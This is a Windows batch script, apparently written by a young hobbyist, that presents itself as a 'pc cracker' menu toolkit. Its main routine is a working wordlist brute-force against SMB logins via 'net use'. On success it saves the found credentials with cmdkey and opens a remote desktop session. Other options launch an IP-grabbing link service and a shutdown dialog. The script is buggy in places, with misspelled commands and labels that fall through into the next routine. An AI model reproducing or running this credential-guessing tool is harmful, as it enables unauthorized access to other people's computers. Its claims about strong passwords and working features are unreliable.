@echo off
title Enom v1 by A-unown
color 5
dir /r
timeout /t 1 >false
dir /r
timeout /t 2 >false
dir /r
curl ascil.live/forrest 
cls
echo [0-      ]
timeout /t 1 >false
cls
echo [0- 0-   ]
timeout /t 1 >false
cls
echo [0- 0- 0-]
timeout /t 1 >false
echo click space to load -----Enom-----
pause >false
mode 1000    
cls                                                                                               
echo           .....                 ....                ....                  ....        ....         
echo       .^~!77?77!~^.    .JYYY!~?Y5PP5Y?~.       .^7J5PPP5Y?!:     .JYYY!!J5PPP5Y7: .~?Y5PP5Y?^      
echo     .~7???????????7~.  .PGGGGGBGGPGGGGGY:     !5GGGGGPPGGGGP?:   :GGGGGGGGPGGGGGP?5GGGGPGGGGGJ.    
echo    :7????~:..:~????J!. .PGGGGP?^::^7PGGG5.  .JGGGGY~:::^7PGGGP^  :PGGGG5!^::~YGGGGGGY~::^7PGGGJ    
echo    !???7.  :~7???7!:.  .PGGGP^      ~GGGG!  !GGGG!       :5GGG5. :PGGG5:      YGGGG?      !GGGG^   
echo   .????^:~7???7!^.     .PGGGJ       .PGGG?  JGGGP         7GGGG: :PGGG?       7GGGG:      ^GGGG~   
echo    !???????7!:.        .PGGG?       :PGGG?  !GGGG!       :5GGG5. :PGGG7       7GGGP:      ^GGGG~   
echo    .7?????!:..:^!7~:.  .PGGG?       :PGGG?   ?GGGGY!^::~?PGGGP^  :PGGG7       7GGGP:      ^GGGG~   
echo     .~7????????????7:  .PGGG?       :GGGB?    ~YGGGGGGGGGGGP?:   :GGGB7       ?GGGG:      ^GGGG~   
echo       .:~!77777!!^:    .JJJY!       .JJJY!      ^7JY5555Y?~.     .JJJY~       !YJJJ.      :JJJJ^   
echo             ..                                      ...                                            
                                                                                                                                                                         
echo best pc cracker
echo ---------------
echo bugs:
echo the new ip locator 
echo opens password
echo gen but it still 
echo works.shutdown 
echo pc's is temorary
echo grtting fixed
echo ---------------
echo status:
echo pc hack - unknown
echo old locator - online
echo view network - online
echo shutdown pc's - offline
echo matrix emulator - online
echo new ip locator - online
echo password gen - has bugs butt works
echo ---------------
echo ---------------
echo software:
echo 1 :pc hack          ]
echo 2 :ip locator -old  ] 9 :ip graber
echo 3 :view network     ] 10:link shortener
echo 4 :info             ] 11:discord webhook for server
echo 5 :shudown pc's     ]
echo 6 :matrix emulator  ]
echo 7 :ip locator -best ]
echo 8 :password gen     ]
echo -------------
set /p ans="Enter 1-11 only:"
if %ans%==1 (
goto pchack )
if %ans%==2 (
goto loc )
if %ans%==3 (
goto ad )
if %ans%==4 (
goto im )
if %ans%==5 (
goto shu )
if %ans%==6 (
goto mat )
if %ans%==7 (
goto bes )
if %ans%==8 (
goto pasg )
if %ans%==9 (
goto ipget )
if %ans%==10 (
goto linkshort )
if %ans%==11 (
goto disc )


:pchack
color c
cls
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="passlist file:"

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
Cmdkey /add:%ip% /user:%user% /pass:%pass% >nul
Mstsc/v:%ip%
Cmdkey /delete:%ip%
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

:loc
cls
color 9
echo to locate the ip goto https://www.iplocation.net/ip-lookup
echo --------------------
echo if it is a website type the url and click enter then coppy the desired ip
set /p loc="type the website or ip:"
ping %loc%
echo ------------
echo ------------                                                                
echo Now copy the ip of the website and go to https://www.iplocation.net/ip-lookup
echo                                                                              
pause
start https://www.iplocation.net/ip-lookup
exit

:im
cls
color e
echo this is Enom
echo a young developer made this 
echo at the age of 12 it took
echo 2 weeks
echo  --------------------               
echo Pc hack may not be working 
echo a additional file is needed for it
echo it will only work if the pass word is in that file
echo ------------------------
echo this paticular software was originated in the uk
echo it is simple but effective
echo if you need help join the disscord wich will be out soon
set /p close="enter to close:"
pause 
exit

:ad
cls
color a
echo --------------------------------
echo it will let you view
echo all devices and ip conected to
echo your network
echo --------------------------------
set /p minad="enter to add the panel:"
dir /r
timeout /t 1 >false
cls 
arp -a
echo --------------------
echo complete
echo --------------------
pause >false
exit

:shu
cls
echo ---------------------
echo TEMPORERY BROKEN
echo ---------------------
set /p minad="enter to add a popup:"
shudown -i
cls
echo NOT COMPLETED
pause >false
exit

:mat
cls
echo --------------------------
echo emulate matrix
echo u will need to manuly close
echo enom to stop it
echo --------------------------
set /p matri="enter to run:"
color a
:trix


:trix
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
goto trix

:bes
cls
start iptrack.bat
end

:pasg
cls
echo -------------------------------
echo welcome to password generator
echo it will generate strong
echo never used before paswords
echo -------------------------------
set /p genp="enter to generate:"
echo %random%%random%%random%%random%
echo --------------------------------
echo complete!
pause >false
end


:ipget
start https://grabify.link/
end

:linkshort
start https://app.bitly.com/
end

:disc
start disc.bat
end





